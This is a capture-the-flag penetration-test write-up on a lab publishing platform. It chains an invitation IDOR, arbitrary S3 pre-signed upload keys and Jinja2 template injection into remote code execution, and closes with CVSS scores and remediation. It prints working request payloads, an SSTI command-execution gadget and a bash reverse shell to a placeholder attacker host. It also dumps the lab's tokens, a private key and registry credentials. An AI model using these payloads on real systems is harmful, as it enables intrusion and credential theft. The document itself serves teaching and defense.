# Broken Access Control -> Unauthorized S3 File modification -> SSTI -> RCE

> *NOTE: This report is for educational purposes only. The target environment was an authorized offensive security CTF challenge. DO NOT attempt to target or test systems that you do not own or do not have explicit permission to test.*

> You may view individual write-up for each finding by visiting the individual files (e.g. BrokenAccessControl_Finding1.md)


# **Vulnerability Definition & Executive Summary**

The Northline publishing platform suffers from Broken Access Control / Insecure Direct Object Reference (IDOR), followed by unrestricted S3 pre-signed upload key manipulation, and Server-Side Template Injection (SSTI) leading to a Remote Code Execution.

The flawed authorization logic occurs within the project invitation and membership assignment routine allowing an authenticated user to modify the target `project_id` during invitation acceptance. This allows the attacker to invite themselves into the victim's workspace, granting unauthorized editor privileges.

After that, the asset pre-signing endpoint fails to enforce strict path confinement on the destination storage key, permitting an attacker to request a pre-signed AWS S3 **PUT URL** targeting internal layout templates (`render/layout.html`). This enables the attacker to overwrite the server-side rendering template.

Lastly, when the backend preview worker processes the site build using Python's **Jinja2** rendering engine, it parses the attacker-controlled template. By traversing `self.__init__.__globals__` into loaded runtime modules (`sys.modules['__main__'].os`), execution is pivoted into arbitrary command execution, resulting in a Remote Code Execution (RCE).

Additional findings resulting from the RCE include:
- **Container Environment Variables**
- **Internal Service Credentials (e.g. tokens, private keys)**
- **Worker Service Source Code**


# Finding 1

## Broken Access Control on northline.prod.local:9080 through /api/data/project_memberships via POST Parameter "project_id" leading to unauthorized workspace invitation 

- **Target:** **northline.prod.local:9080**
- Vulnerable Endpoint: **POST /api/data/project_memberships**
- Vulnerable Component: POST Parameter `project_id`

On **northline.prod.local:9080** through **/api/data/project_memberships**, the HTTP requests containing a manipulated `project_id` and `role` parameter within the JSON payload were transmitted during invitation redemption, bypassing ownership validation checks between the issued invitation token and the target workspace.

As a result, the attacker can associate their authenticated user account with any customer project/workspace on the platform with elevated `editor` permissions, granting unauthorized read access to the workspace. 


### Proof of Concept


- Register or sign in to an account controlled by the tester.
- In a workspace the tester controls, create an invitation for that account.
- Open the invitation link and proceed to **Join Project**.

<img width="1892" height="886" alt="image" src="https://github.com/user-attachments/assets/6ff3aaed-b8ed-40ca-9f91-2bbbb61316df" />


- Intercept the membership **POST request** to **/api/data/project_memberships** and replace `project_id` value with the target workspace ID. Retain the current user's `user_id` and set `role` to `editor` as in the captured request.

```http
POST /api/data/project_memberships HTTP/1.1
Host: northline.prod.local:9080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://northline.prod.local:9080/invite/1XBauYJVLeCa2TxZfewg6uheRny3uBRN
Content-Type: application/json
Prefer: return=minimal
Authorization: Bearer {REDACTED}
Content-Length: 118
Origin: http://northline.prod.local:9080
Connection: keep-alive
{
  "project_id": "<target-project-id>",
  "user_id": "<attacker-user-id>",
  "role": "editor"
}
```

- Submit the request. The server returned `201 Created`.
   
<img width="1532" height="800" alt="image" src="https://github.com/user-attachments/assets/ba76f9b1-18a4-476e-a87e-e9679f6bb6b1" />

- Refresh the dashboard and confirm that the account appears in the target workspace. Open the Team view to confirm the accessible member details.


A successful response and subsequent dashboard access demonstrate that the membership was created in the target workspace.

<img width="1867" height="896" alt="image" src="https://github.com/user-attachments/assets/73a74b8f-a31e-4fba-b491-174107d7067f" />


# Finding 2: 

## Arbitrary Storage Key Path Manipulation (S3 Pre-Signed Uploads) on northline.prod.local:9080 through /api/projects/{target_workspace_uuid}/uploads/sign via POST parameter "key" leading to unauthorized modification of rendering templates

- Target: **northline.prod.local:9080**
- Vulnerable Endpoint: **POST /api/projects/{project_id}/uploads/sign**
- Vulnerable Component: POST parameter `key`

On **northline.prod.local:9080** the **POST request** to **/api/projects/{project_id}/uploads/sign** accepts an arbitrary storage `key` instead of limiting uploads to the caller's asset directory. A request for a key under **projects/<target-project-id>/render/** was signed successfully. The resulting pre-signed URL permitted a PUT to **render/layout.html**, outside the intended **projects/<authorized-project-id>/assets/** namespace. This finding is exploitable after obtaining editor access to the target workspace (for example, through Finding 1).

As a result, the attacker can leverage the generated pre-signed URL to upload and overwrite template files on the underlying object storage bucket **/nl-assets/**. This allows the attacker to replace trusted rendering layouts with malicious template payloads.


### Proof of Concept 


- Authenticate as a user with editor access to the target workspace. This access can be obtained through Vulnerability Finding 1 (Broken Access Control).
- Send a signing request with a key targeting the workspace's rendering template. Record the `put_url` value from the server response. Do keep in mind to generate a fresh URL for each reproduction because the signature expires.

```http
POST /api/projects/{project-id}/uploads/sign HTTP/1.1
Host: northline.prod.local:9080
Content-Type: application/json
Authorization: Bearer <access-token>

{"key":"projects/{target_project_id}/render/layout.html"}
```


<img width="1517" height="777" alt="image" src="https://github.com/user-attachments/assets/3c45ec72-3056-44ee-8679-7adbdf3d4426" />

- Send a PUT request to that URL with a replacement HTML/Jinja template as the body.

```http
PUT {put_url-from-signing-response} HTTP/1.1
Host: northline.prod.local:9080
Content-Type: text/html

<h1>Template modified for assessment</h1>
<p>{{ site.description }}</p>
```

<img width="1888" height="983" alt="image" src="https://github.com/user-attachments/assets/8b0a632d-8fcc-4457-82ae-44da57aaab66" />

- In the Studio interface, trigger **Build → Generate Preview**. Then visit the generated preview and confirm that the modified template content appears.
  
<img width="1918" height="1002" alt="image" src="https://github.com/user-attachments/assets/3458da1c-f3d0-49df-9d9d-2ca856f47d27" />


Signing request (use the authorized project ID in the route and target object key from the CTF instance):


*NOTE The initial replacement used harmless template content to verify that the object had been overwritten. The SSTI payload and worker impact are documented separately in [[Finding 3 - Writeup]].*





# Finding 3:
## Server-Side Template Injection (SSTI) on northline.prod.local:9080 through /nl-assets/projects/{target_workspace_uuid}/render/layout.html leading to Remote Code Execution (RCE)
 
- Target: **northline.prod.local:9080**
- Vulnerable Component: Jinja2 Template Engine (`jinja2.Environment.from_string().render()`)
- Vulnerable Routine / File: `/app/worker.py` (Background Build Worker)
- Trigger Vector: Studio Build Preview Workflow (via the web application dashboard)**


On **northline.prod.local:9080** through **/nl-assets/projects/{target_workspace_id}/render/layout.html** and the Studio preview worker trigger, HTTP requests containing custom Jinja2 expressions were injected into the template layout, which was subsequently evaluated by Python's Jinja2 runtime without context sandboxing or expression filtering.


As a result, the attacker can access `self.__init__.__globals__.sys.modules['__main__'].os.popen()` to execute arbitrary operating system commands within the preview worker container, leading to Remote Code Execution (RCE).


### Proof of Concept

- Obtain editor access to the target workspace. In the complete chain, follow Finding 1 - Writeup.
- Use the upload-signing flaw in Finding 2 - Writeup to replace `render/layout.html` with a test template.
- We can verify template evaluation with a harmless expression or by sending the following **PUT request**

```http
PUT {put_url-from-signing-response} HTTP/1.1
Host: northline.prod.local:9080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/html
Content-Length: 236
Origin: http://northline.prod.local:9080
Connection: keep-alive


<h1>Template test</h1>
<p>{{ 7 * 7 }}</p>
```

- Trigger **Build → Generate Preview** in Studio and inspect the preview. The test rendered `49`, confirming expression evaluation.

<img width="1845" height="953" alt="image" src="https://github.com/user-attachments/assets/2f3e1e10-658a-440f-b66e-e683f6e367a9" />




- Generate another preview and inspect its output. The returned process identity confirms command execution in the worker context. To do that, send the following **PUT request**

```http
PUT {put_url-from-signing-response} HTTP/1.1
Host: northline.prod.local:9080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/html
Content-Length: 236
Origin: http://northline.prod.local:9080
Connection: keep-alive

<h1>{{ site.headline }}</h1>
<p>
{{ self.__init__.__globals__.sys.modules['__main__'].os.environ }}
</p>
```

<img width="1878" height="902" alt="image" src="https://github.com/user-attachments/assets/f5a1af59-c122-44c2-a1f1-0534050ec3fd" />


As we can observe in the image above, we are able to read environment variables and worker files. Do not expose captured token, private-key, or registry-credential values in shared copies of the report.


- To initialize a basic Remote Code Execution, we can send the following **PUT request**, replacing the {INSERT_COMMAND} with the command you wish to run.

```http
<h1>{{ site.headline }}</h1>
<p>
{{ self.__init__.__globals__.sys.modules['__main__'].os.popen('{INSERT_COMMAND}').read() }}
</p>
```

- In our case, we have obtained a reverse shell, allowing us to view the same environment file earlier.
  
```http
PUT {put_url-from-signing-response} HTTP/1.1
Host: northline.prod.local:9080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/html
Content-Length: 236
Origin: http://northline.prod.local:9080
Connection: keep-alive

<h1>{{ site.headline }}</h1>
<p>
{{ self.__init__.__globals__.sys.modules['__main__'].os.popen("setsid nohup bash -c 'bash -i >& /dev/tcp/{ATTACKER_SERVER}/{PORT} 0>&1 &' >/dev/null 2>&1 &").read() }}
</p>
```

*Result*

```bash
HOSTNAME=7f137f0e869c
WORKER_TOKEN=VeT8iX1PU251DWtkNdPHc0fzuiRU3Soq6FvdnTiJUtMu4oxtuH18rw
HOME=/home/worker
GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305
PYTHON_SHA256=5c8462af5790baf43a321a1559dbe0db06d1be4300fb85fb53c40060668e548a
RELEASE_URL=http://release:7070
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
REGISTRY_URL=http://registry:5000
LANG=C.UTF-8
PYTHON_VERSION=3.12.14
VALKEY_URL=redis://valkey:6379/0
PWD=/app
API_INTERNAL_URL=http://api:8000
```

<img width="775" height="181" alt="image" src="https://github.com/user-attachments/assets/12476517-dc0e-437f-bc95-dc7d4b3624d0" />

- Moreover, we have read access to the preview_key.pem and the registry_credentials

```python
worker@7f137f0e869c:/run/secrets$ ls
preview_key.pem  registry_credentials  worker_ref
worker@7f137f0e869c:/run/secrets$ cat preview_key.pem 
-----BEGIN PRIVATE KEY-----
MC4CAQAwBQYDK2VwBCIEIEMDEAFL976Oix9UDMZysrxwlVmYKXbsu0AclwzK55m+
-----END PRIVATE KEY-----
worker@7f137f0e869c:/run/secrets$ cat registry_credentials 
preview-worker:tkDPW4xZ8wmWaPf1eucHqAf0cfBRgDNMzGjZLA
worker@7f137f0e869c:/run/secrets$ 
```

Additionally, we were able to read private key belonging to the compromised Worker, tokens and other form of credentials.

Moreover, the source code `/app/worker.py` was located and read.

```bash
cat /app/worker.py
```

```python
from __future__ import annotations

import hashlib
import multiprocessing
import os
import queue
import signal
import time
import traceback

import redis
import requests
from jinja2 import Environment


VALKEY_URL = os.environ["VALKEY_URL"]
API_URL = os.environ["API_INTERNAL_URL"].rstrip("/")
TOKEN = os.environ["WORKER_TOKEN"]
HEADERS = {"X-Worker-Token": TOKEN}


def render_child(template: str, site: dict, result_queue: multiprocessing.Queue):
    os.setsid()
    try:
        environment = Environment(autoescape=True)
        html = environment.from_string(template).render(site=site)
        result_queue.put({"state": "succeeded", "preview_html": html[:200_000], "error": ""})
    except BaseException as exc:
        result_queue.put({"state": "failed", "preview_html": "", "error": f"{type(exc).__name__}: {exc}"})


def process_build(build_id: str):
    job_resp = requests.post(API_URL + f"/internal/build-job/{build_id}", headers=HEADERS, timeout=5)
    if job_resp.status_code != 200:
        print(f"build {build_id}: unavailable {job_resp.status_code}", flush=True)
        return
    job = job_resp.json()
    template_sha = ""
    try:
        template_resp = requests.get(job["template_url"], timeout=8)
        template_resp.raise_for_status()
        template_bytes = template_resp.content
        if len(template_bytes) > 200_000:
            raise ValueError("Template exceeds the preview limit.")
        template = template_bytes.decode("utf-8")
        template_sha = hashlib.sha256(template_bytes).hexdigest()
        result_queue: multiprocessing.Queue = multiprocessing.Queue(maxsize=1)
        child = multiprocessing.Process(target=render_child, args=(template, job["site"], result_queue))
        child.start()
        child.join(timeout=20)
        if child.is_alive():
            try:
                os.killpg(child.pid, signal.SIGKILL)
            except ProcessLookupError:
                pass
            child.join(timeout=2)
            result = {"state": "failed", "preview_html": "", "error": "Preview exceeded the 20-second render limit."}
        else:
            try:
                result = result_queue.get(timeout=2)
            except queue.Empty:
                result = {"state": "failed", "preview_html": "", "error": "Renderer exited without a result."}
    except Exception as exc:
        result = {"state": "failed", "preview_html": "", "error": f"{type(exc).__name__}: {exc}"}
    result["build_id"] = build_id
    result["template_sha256"] = template_sha
    try:
        post = requests.post(API_URL + "/internal/build-result", json=result, headers=HEADERS, timeout=5)
        print(f"build {build_id}: {result['state']} ({post.status_code})", flush=True)
    except requests.RequestException as exc:
        print(f"build {build_id}: result delivery failed: {exc}", flush=True)


def main():
    connection = redis.Redis.from_url(VALKEY_URL, decode_responses=True)
    while True:
        try:
            item = connection.blpop("northline:builds", timeout=5)
            if item:
                process_build(item[1])
        except KeyboardInterrupt:
            raise
        except BaseException as exc:
            print(f"worker loop recovered from {type(exc).__name__}: {exc}", flush=True)
            time.sleep(2)


if __name__ == "__main__":
    main()
```

*NOTE: No destructive actions or denial-of-service tests were performed. Arbitrary command execution could nevertheless disrupt or terminate worker processes, which is reflected in the provisional availability rating.*



---
# Impact
- Unauthorized invitation of users to an external workspace that they shouldn't have access to.
- Insufficient server-side path validation allowing authenticated users to overwrite the workspace's application templates `render/layout.html` stored within object storage.
- Remote Code Execution (RCE), as a result of the Server Side Template Injection (SSTI) vulnerability. Unsandboxed evaluation of the Jinja2 templates directly executes arbitrary operating system commands with `worker` user privileges within the preview rendering container.
	- Additional Finding includes; Container environment Variable and Worker Container Source Code, Credentials such as Tokens, `.pem` Private key, Registry credentials belonging to the user.

---
# CVSS

## Finding 1: Broken Access Control leading to unauthorized workspace invitation 

*CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N - 6.5 (Medium)*

- **Attack Vector (AV):** Network (`N`) - Exploitable remotely (via the network) on the HTTP endpoints.
- **Attack Complexity (AC):** Low (`L`)  - The UUID pre-requisite can be found publicly.
- **Privileges Required (PR):** None (`N`) -  Although the exploit requires a registered account, anyone can self-register and create an account. Making it exploitable by anyone.
- **User Interaction (UI):** None (`N`) - The exploit does not require the victim to take action.
- **Scope (S):** Unchanged (`U`) -  The vulnerable component and the impacted component are the same
- **Confidentiality (C):** Low (`L`) - The resulting impact of the vulnerability exposes the Full name and Email address of the members of the compromised Workspace. No other sensitive personal details have been exposed.
- **Integrity (I):** Low (`L`) - Unauthorized invitation of users to arbitrary workspaces. No major system-wide integrity was demonstrated via the vulnerability.
- **Availability (A):** None (`N`) - There were no Availability impact shown in this vulnerability. Additionally, the editor does not have the ability to delete or alter the existing live website within the compromised Workspace.

## Finding 2: Arbitrary Storage Key Path Manipulation (S3 Pre-Signed Uploads)

*CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N - 4.3 (Medium)*

- **Attack Vector (AV): Network (`N`)** - Can be exploited over network via the HTTP requests.
- **Attack Complexity (AC): Low (`L`)** - No additional conditions required to exploit, and changing the JSON parameter value `key` will give us a valid pre-signed **PUT** URL.
- **Privileges Required (PR): Low (`L`)** - Requires an account that possesses `editor` role on the workspace (the role can be acquired via Finding 1).
- **User Interaction (UI): None (`N`)** - No interaction required from other users.
- **Scope (S): Unchanged (`U`)** - Both the asset-signing endpoint and the S3 bucket operate within the object-storage domain of the application.
- **Confidentiality (C): None (`N`)** - The generated a pre-signed `PUT` URL and uploading a template does not read or leak files directly by itself.
- **Integrity (I): Low (`L`)** - Through the vulnerability, it was shown that the attacker can modify and replace the internal layout template (`render/layout.html`) of the workspace on object storage.
- **Availability (A): None (`N`)** - The object storage service remained available, and no files were deleted.


## Finding 3: Server-Side Template Injection (SSTI) leading to a Remote Code Execution

*CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H - 9.9 (Critical)*

- **Attack Vector (AV): Network (`N`)** - Exploited remotely over the network.
- **Attack Complexity (AC): Low (`L`)** - The exploit doesn't need pre-requisites to be successful. As shown in the PoC, the Jinja2 template syntax (`{{ ... }}`) is directly processed without filtering or execution obstacles.
- **Privileges Required (PR): Low (`L`)** - Requires an account that possesses `editor` role on the workspace (the role can be acquired via Finding 1), to trigger a build preview on a project where the layout was replaced.
- **User Interaction (UI): None (`N`)** - The execution does not require any user to interact, and the preview build is initiated as soon as it is requested.
- **Scope (S): Changed (`C`)** -  The vulnerability exists within the web application template parser (Jinja2), as a result the execution breaks out directly into the underlying operating system environment of the `preview-worker` container.
- **Confidentiality (C): High (`H`)** - It was demonstrated that we can extract sensitive container environment variables (`WORKER_TOKEN`), local filesystem source code (`worker.py`), internal private keys (`preview_key.pem`), and registry credentials (`registry_credentials`).
- **Integrity (I): High (`H`)** - Integrity is rated High because the attacker achieved interactive shell access and arbitrary command execution with the privileges of the worker user.
- **Availability (A): High (`H`)** - While the container did not suffer a full denial of service, the attacker demonstrated arbitrary command execution and background process execution, with the capability to interrupt or terminate the local worker process.


## Overall Vulnerability Chain CVSS

*CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H — Score: 10.0 (Critical)*

- **Attack Vector (AV): Network (`N`)** - The exploit can be chained and executed entirely over the network via standard HTTP endpoints.
- **Attack Complexity (AC): Low (`L`)** - The vulnerability follows a deterministic, repeatable path from public project reconnaissance to remote code execution.
- **Privileges Required (PR): None (`N`)** - Privileges Required is None because, when chained from the initial entry point, an unauthenticated external attacker can self-register an account, force membership into an arbitrary workspace, modify storage keys, and achieve execution without pre-existing authorized access to the target workspace.
- **User Interaction (UI): None (`N`)** - The attack sequence can be performed by the attacker only, without any other User Interaction.
- **Scope (S): Changed (`C`)** - The execution moves from an external unprivileged perspective through the web application and into the isolated backend infrastructure layer (`worker` container via the Remote Code Execution.
- **Confidentiality (C): High (`H`)** - It is demonstrated that the chain has total compromise of local secrets, private cryptographic signing keys, internal API tokens, and backend source code.
- **Integrity (I): High (`H`)** - It was demonstrated that we can modify workspace files and achieve  arbitrary remote code execution.
- **Availability (A): High (`H`)** -  While the Web App and the underlying OS Infrastructure did not suffer a denial of service, the attacker demonstrated arbitrary command execution and background process execution, with the capability to interrupt or terminate the local worker process.

---
# Remediation

- Implementing Server-Side Authorization on Invitation Acceptance:
   - In the **POST request** to **/api/data/project_memberships** handler, remove `project_id` and role from the accepted client request body.
   - When the user redeems an invite token (from **/invite/{token}**), query the database for that specific invitation record on the backend, verify it is still valid and not expired, and automatically assign the `project_id` and role defined by the original owner in that record.

- Enforce Directory and File Path Whitelisting in S3 Pre-Signing:
   - In **POST request** to **/api/projects/{project_id}/uploads/sign**, do not allow arbitrary values in the `key` JSON parameter.
   - Reject any upload request where the path points to or includes **/render/, /layout.html,** or contains directory traversal sequences (like ../).

- Sandbox Jinja2 Template Rendering in /app/worker.py:
   - In /app/worker.py (render_child function, line 298), stop using the default Environment class.

*Vulnerable (Original):*

```python
from jinja2 import Environment
environment = Environment(autoescape=True)
```

*Remediated (Fixed):*

```python
from jinja2.sandbox import SandboxedEnvironment
environment = SandboxedEnvironment(autoescape=True)
```

   - This explicitly blocks templates from accessing dangerous internal Python attributes like `__globals__`, `__subclasses__`, and `sys.modules`.
   - If the template only needs to display basic text fields, remove full Jinja2 execution entirely and switch to a logic-less template engine (like chevron/mustache) or restrict the context dictionary strictly to primitive strings.

- Isolate Container Network and Remove Plaintext Secrets:
   - In Docker / Docker Compose network configs, move the preview-worker container into an isolated network.
   - Remove long-lived, high-privilege secrets (such as `WORKER_TOKEN`) from container environment variables (`os.environ`). Instead, use short-lived, scoped tokens generated on-demand per job.

- Deploy Web Application Firewall (WAF) Rules:
   - Deploy or configure WAF inspection rules on the reverse proxy (Caddy) to inspect incoming **POST** and **PUT** **request** bodies for common Server-Side Template Injection (SSTI) patterns (such as `{{`, `}}`, `__globals__`, and `__class__`).
	- *Note: A WAF serves only as a detection layer. It does not replace proper server-side authorization checks for IDOR or proper input whitelisting on file upload endpoints.*

- Upgrade Jinja2 to version **`3.1.6` or higher** to ensure known sandbox breakout vulnerabilities are patched.

---

# References

- [OWASP Top 10 - A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [PortSwigger Web Security Academy: Server-Side Template Injection (SSTI)](https://portswigger.net/web-security/server-side-template-injection)
- [Jinja2 Documentation: Sandboxed Environment](https://jinja.palletsprojects.com/en/3.1.x/sandbox/)
- [AWS S3 Security Best Practices: Restricting Pre-signed URLs](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
